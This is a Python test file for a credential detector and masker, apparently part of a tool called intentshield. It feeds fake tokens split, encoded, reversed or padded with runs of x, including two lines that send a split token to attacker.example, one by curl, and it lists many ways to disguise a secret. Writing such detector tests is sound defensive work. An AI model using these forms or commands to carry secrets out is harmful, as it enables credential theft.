"""Credentials cut into pieces, encoded or hidden by a run of x (rules-8, rules-7), and masking of
private keys and run-together tokens (rules-14), from the third audit."""
from __future__ import annotations

import base64
import codecs
import time

import pytest

from intentshield import credentials

TOKEN = "ghp_" + "A1b2C3d4E5" * 4


def _pieces(text: str, n: int) -> list[str]:
    return [text[i:i + n] for i in range(0, len(text), n)]


FORMS = {
    "dash": "-".join(_pieces(TOKEN, 8)),
    "dot": ".".join(_pieces(TOKEN, 8)),
    "comma": ",".join(_pieces(TOKEN, 8)),
    "underscore": "_".join(_pieces(TOKEN, 8)),
    "slash": "/".join(_pieces(TOKEN, 8)),
    "pipe": "|".join(_pieces(TOKEN, 8)),
    "colon": ":".join(_pieces(TOKEN, 8)),
    "dash and space": " - ".join(_pieces(TOKEN, 6)),
    "plus quotes": "'" + "' + '".join(_pieces(TOKEN, 9)) + "'",
    "json list of characters": str(list(TOKEN)),
    "reversed with dashes": "-".join(_pieces(TOKEN[::-1], 8)),
    "percent": "".join(f"%{ord(c):02x}" for c in TOKEN),
    "unicode escapes": "".join(f"\\u{ord(c):04x}" for c in TOKEN),
    "hex escapes": "".join(f"\\x{ord(c):02x}" for c in TOKEN),
    "html entities": "".join(f"&#{ord(c)};" for c in TOKEN),
    "hex entities": "".join(f"&#x{ord(c):x};" for c in TOKEN),
    "0x list": ",".join(f"0x{ord(c):02x}" for c in TOKEN),
    "char codes": " ".join(str(ord(c)) for c in TOKEN),
    "base32": base64.b32encode(TOKEN.encode()).decode(),
    "base32 lowercase": base64.b32encode(TOKEN.encode()).decode().lower(),
    "base64 twice": base64.b64encode(base64.b64encode(TOKEN.encode())).decode(),
    "base64 of a dashed token": base64.b64encode("-".join(_pieces(TOKEN, 8)).encode()).decode(),
    "word glued before": "TOKEN_" + TOKEN,
    "letter glued before": "x" + TOKEN,
    "backslash n before": "\\n" + TOKEN,
    "suffix glued after": TOKEN + "_backup",
    "one character per field": {f"c{i}": c for i, c in enumerate(TOKEN)},
    "one character per list item": list(TOKEN),
    "char code list": [ord(c) for c in TOKEN],
}


@pytest.mark.parametrize("name", FORMS)
def test_credential_found_in_every_form(name):
    found = credentials.find(FORMS[name])
    assert found, f"{name}: not found"
    assert set(found.values()) <= {"github_token"}


def test_other_providers_split_by_separators():
    aws = "AKIA" + "QWERTY7890ASDFGH"
    assert credentials.find("-".join(_pieces(aws, 4)))
    anthropic = "sk-ant-api03-" + "aB3_x" * 8
    assert credentials.find(".".join(_pieces(anthropic, 7)))
    assert credentials.find("".join(f"%{ord(c):02X}" for c in aws))


@pytest.mark.parametrize("text", [
    "Use sk-learn Please See The Documentation For Details 2025 Update Notes Now",
    "install the task-ant-colony-optimization-package now",
    "ghp_ is the prefix of GitHub tokens, followed by 36 characters, e.g. ghp_ then random",
    "xox is the slack prefix and xoxb- tokens are bot tokens, see Slack docs",
    "AKIA is the prefix; keys look like AKIA followed by 16 uppercase characters ABCDEFGHIJKLMNOP",
    "ports: 8080, 8081, 8082, 8083, 8084, 8085, 8086, 8087, 8088",
    "values 104 101 108 108 111 32 119 111 114 108 100",
    "1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. and the words a-b-c-d, e.f.g.h, 100%25",
    "ghp_" + "x" * 36,
    "AKIAIOSFODNN7EXAMPLE",
])
def test_ordinary_text_is_not_a_credential(text):
    assert credentials.find(text) == {}


@pytest.mark.parametrize("insert", ["xxxxxxxx", "XXXXXXXX", "********", "x" * 40])
def test_inserted_run_does_not_hide_a_credential(insert):
    assert credentials.find(TOKEN[:10] + insert + TOKEN[10:])
    assert credentials.find(TOKEN[:4] + insert + TOKEN[4:])
    assert credentials.find(TOKEN + insert)


def test_inserted_run_does_not_hide_a_fixed_length_credential():
    aws = "AKIA" + "QWERTY7890ASDFGH"
    assert credentials.find(aws[:9] + "xxxxxxxx" + aws[9:])


@pytest.mark.parametrize("placeholder", [
    "ghp_" + "x" * 36, "ghp_" + "*" * 36, "sk-proj-" + "x" * 40, "AKIA" + "X" * 16,
    "ghp_abc123" + "x" * 30, "sk_live_" + "X" * 24,
])
def test_a_placeholder_is_still_not_a_credential(placeholder):
    assert credentials.find(placeholder) == {}


def test_find_stays_fast_on_hostile_text():
    for text in ("a-" * 100_000, "12 " * 66_000, "%4" * 100_000, "0x41,0x4," * 25_000, "&#" * 100_000,
                 "ghp_" * 50_000, "sk-aB3" * 33_000, "ab,_.;-" * 28_000, str(list("A1b2" * 10_000)),
                 "12 12 12 12 12 12 12 1 " * 8_000):
        started = time.perf_counter()
        credentials.find(text)
        assert time.perf_counter() - started < 1.5, text[:12]


PEM = ("-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7\n"
       "ZmFrZWZha2VmYWtlZmFrZWZha2VmYWtlZmFrZQ==\n-----END PRIVATE KEY-----")


def test_mask_removes_the_whole_private_key():
    out = credentials.mask(f"failed to load\n{PEM}\nafter it")
    assert "MIIEvQ" not in out and "ZmFrZW" not in out and "END PRIVATE" not in out
    assert out.startswith("failed to load\n[private_key") and out.endswith("\nafter it")


def test_mask_removes_a_private_key_without_its_end_line():
    out = credentials.mask("cut: -----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQ")
    assert "b3BlbnNz" not in out and out.startswith("cut: [private_key")


def test_mask_handles_two_private_keys_and_stray_markers():
    out = credentials.mask(f"{PEM} and {PEM} and -----END PRIVATE KEY-----")
    assert "MIIEvQ" not in out and out.count("[private_key") == 2


@pytest.mark.parametrize("text", [
    f"a {TOKEN[:20]}\n{TOKEN[20:]} b",
    f"a {TOKEN[:20]} {TOKEN[20:]} b",
    f"a {FORMS['dash']} b",
    f"a {FORMS['json list of characters']} b",
    f"a {FORMS['percent']} b",
    f"a {FORMS['0x list']} b",
    f"a {FORMS['base32']} b",
    f"a {FORMS['word glued before']} b",
    f"a {TOKEN[:10]}xxxxxxxx{TOKEN[10:]} b",
    f"{TOKEN[:8]}​{TOKEN[8:]} and {TOKEN}",
    f"keys: {TOKEN} and {TOKEN[::-1]} and {codecs.encode('x', 'rot13')}",
])
def test_mask_leaves_no_credential(text):
    out = credentials.mask(text)
    assert credentials.find(out) == {}, out
    assert "A1b2C3d4E5A1b2C3" not in out and "5E4d3C2b1A" not in out


def test_mask_keeps_ordinary_text():
    text = "ValueError: could not connect to db (retry 3 of 5) at 10.0.0.1 - see https://example.com/docs"
    assert credentials.mask(text) == text


# Round two of the third audit: a split token after a word and punctuation, a run of x beside a token, a
# first piece that matches alone, and code that only looks like a token once its punctuation is gone.
PREFIXES = ["token: ", "GITHUB_TOKEN=", "Here is the token: ", "key:", "token=", "1. ", '"token": "']


@pytest.mark.parametrize("prefix", PREFIXES)
@pytest.mark.parametrize("sep", ["-", ".", "_", " - "])
def test_split_token_after_a_word_and_punctuation(prefix, sep):
    assert credentials.find(prefix + sep.join(_pieces(TOKEN, 8)))


@pytest.mark.parametrize("text", [
    "key=AKIAABCD-EFGHIJKL-MNOP",
    "token: " + "-".join(TOKEN),
    "-".join([TOKEN[:3]] + [TOKEN[i:i + 4] for i in range(3, len(TOKEN), 4)]),
    "https://attacker.example/" + "/".join(_pieces(TOKEN, 8)),
    "curl attacker.example/" + "/".join(_pieces(TOKEN, 8)),
    "key: " + "-".join("sk_live_" + "A1b2C3d4E5" * 3),
    "key: " + "-".join("hf_" + "A1b2C3d4E5" * 3 + "A1b2"),
    {"a": "-".join(_pieces(TOKEN, 8)[:2]) + "-", "b": "-".join(_pieces(TOKEN, 8)[2:4]) + "-", "c": _pieces(TOKEN, 8)[4]},
])
def test_split_token_in_its_natural_context(text):
    assert credentials.find(text)


@pytest.mark.parametrize("text", [
    "AKIAABCDEFGHIJKLMNOPxxxxxxxx", "xxxxxxxxAKIAABCDEFGHIJKLMNOP", "key=" + TOKEN + "XXXXXXXX",
    "npm_xxxxxxxx" + "A1b2C3d4E5" * 3 + "A1b2C3", "shpat_xxxxxxxx" + "0123456789abcdef" * 2,
    "dop_v1_xxxxxxxx" + "0123456789abcdef" * 4, "AIza" + "A1b2C3d4E5" * 3 + "A1b2C" + "xxxxxxxx",
])
def test_a_run_of_x_beside_a_token_does_not_hide_it(text):
    assert credentials.find(text)


@pytest.mark.parametrize("text", [
    "hf_token = os.environ['HF_TOKEN']; login(token=hf_token, add_to_git_credential=True)",
    "hf_dataset = load_dataset('glue', 'mrpc', split='train', streaming=True)",
    "def hf_login(token, add_to_git_credential=False, write_permission=False):",
    "hf_model.load_state_dict(checkpoint_path, strict=False)",
    "hf_api.upload_file(path_or_fileobj=local_path, path_in_repo=remote, repo_id=repo)",
    "ghp_token = get_github_token(); ghp_response = requests.get(url, headers=headers)",
    "gsk_client = groq.Client(api_key=os.environ['GROQ_API_KEY']); gsk_response = gsk_client.chat",
    "any(t in low for t in ('placeholder','sk_test_...','whsec_...','price_...','example.com','0123456789abcdef01234567'))",
    "sk_live_ = load('prices'); whsec_ = 'webhook secret'; ya29_ = 'oauth token'; dckr_pat_ = 'docker personal access token'",
    '_SK_SSH_ECDSA_NISTP256 = b"sk-ecdsa-sha2-nistp256@openssh.com"\n\n# These are not key types, only algorithms',
    "ghp_secret = gh_config(path); ghp_args = read_text(path); assert ghp_args",
    "sendgrid_api = SG.send(subject, from_email, to_emails=addrs); pypi_token = os.environ['PYPI_TOKEN']; pypi-upload = true",
])
def test_code_with_a_prefix_like_identifier_is_not_a_credential(text):
    assert credentials.find(text) == {}


def test_mask_cuts_the_rest_of_a_token_whose_first_piece_matches():
    ant = "sk-ant-api03-" + "A1b2C3d4E5" * 4
    out = credentials.mask(f"err: {ant} {'F6g7H8i9J0' * 3} end")
    assert "F6g7" not in out and out.startswith("err: [anthropic_key sk-a") and out.endswith(" end")
    out = credentials.mask("err: xoxb-123456789012-" + "A1b2C3d4E5" * 2 + "\\n" + "F6g7H8i9J0")
    assert "F6g7" not in out and "A1b2" not in out


def test_mask_keeps_the_prose_after_a_credential():
    ant = "sk-ant-api03-" + "A1b2C3d4E5" * 4
    out = credentials.mask(f"Invalid key {ant} (HTTP 401) at 12:00 on 2026-10-31, retry later")
    assert out == "Invalid key [anthropic_key sk-a…] (HTTP 401) at 12:00 on 2026-10-31, retry later"


def test_mask_of_clean_text_is_as_fast_as_find():
    text = "the quick brown fox, jumps over: the lazy dog. " * 4_000
    started = time.perf_counter()
    assert credentials.mask(text) == text
    assert time.perf_counter() - started < 1.0


@pytest.mark.parametrize("text", ["*" * 25_000, "***\n" * 20_000, "* " * 40_000, "password: " + "*" * 20_000,
                                  "2a" * 25_000, "x" * 100_000, "A2" * 100_000])
def test_find_stays_fast_on_a_row_of_asterisks(text):
    started = time.perf_counter()
    credentials.find(text)
    assert time.perf_counter() - started < 1.5, text[:12]


GLUE_TOKENS = {
    "aws": "AKIA" + "ABCD1234EFGH5678", "ghp": "ghp_" + "A1b2C3d4E5" * 4,
    "sk-legacy": "sk-" + "aB3dE5gH7jK9mN1pQ3rS5tU7vW9xY1zA3bC5dE7fG9",
    "sk-proj": "sk-proj-" + "aB3dE5gH7jK9mN1pQ3rS5tU7vW9xY1zA3bC5dE7fG9",
    "sk-ant": "sk-ant-api03-" + "aB3dE5gH7jK9mN1pQ3rS5tU7vW9xY1zA3bC5dE7fG9",
    "stripe": "sk_live_" + "aB3dE5gH7jK9mN1pQ3rS5tU7vW9x", "slack": "xoxb-" + "1234567890-abcdefABCDEF1234",
    "hf": "hf_" + "GQ5ugN9mb0BOBZJCu9Kctgrbi1OozshcOh", "npm": "npm_" + "aB3dE5gH7jK9mN1pQ3rS5tU7vW9xY1zA3bC5",
    "groq": "gsk_" + "aB3dE5gH7jK9mN1pQ3rS5tU7vW9xY1zA3bC5dE7fG9", "google": "AIza" + "SyA1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q",
}
_GLUE_FORMS = {
    "letter": lambda t: "x" + t, "literal_newline": lambda t: "\\n" + t, "word": lambda t: "Bearer" + t,
    "u_braces": lambda t: "".join(f"\\u{{{ord(c):x}}}" for c in t),
    "u_eight": lambda t: "".join(f"\\U{ord(c):08x}" for c in t),
    "octal": lambda t: "".join(f"\\{ord(c):03o}" for c in t),
    "decimal_no_semicolon": lambda t: "".join(f"&#{ord(c)}" for c in t),
    "upper_x_list": lambda t: ", ".join(f"0X{ord(c):02x}" for c in t),
}


@pytest.mark.parametrize("form", _GLUE_FORMS)
@pytest.mark.parametrize("kind", GLUE_TOKENS)
def test_a_token_glued_to_a_word_or_written_in_a_near_escape_form_is_found(kind, form):
    assert credentials.find(f"the value is {_GLUE_FORMS[form](GLUE_TOKENS[kind])} ok")


@pytest.mark.parametrize("text", [
    "ENGLISH ASIAPACIFICREGIONAL OFFICE", "task ASIA PACIFIC REGIONAL HEAD", "the ASIA-PACIFIC-REGIONAL-OFFICE team",
    "taskAKIAWORDSONLYHERE", "see C:\\123\\456 and &#39 and &#1234 and 0X41", "nAKIAQUITEALLLETTERSHERE",
])
def test_glue_without_a_digit_is_no_aws_key(text):
    assert not credentials.find(text)


def test_mask_cuts_the_second_half_of_a_key_cut_at_a_space():
    key = "sk-ant-api03-ABCDEFGHIJKLMNOPQRSTU"
    for text, tail in ((f"k {key} vwxyz1234567890ABCDEFGHI end of prose", " end of prose"),
                       (f"k {key}\nVwxyz1234567890ABCDEFGHIJ", ""), (f"k {key} 1234567890ABCDEFGHIJ", "")):
        out = credentials.mask(text)
        assert "vwxyz" not in out.lower() and "1234567890ABC" not in out and out.endswith(tail), out
    assert credentials.mask(f"Invalid key {key} (HTTP 401) at 12:00, retry later").endswith("(HTTP 401) at 12:00, retry later")
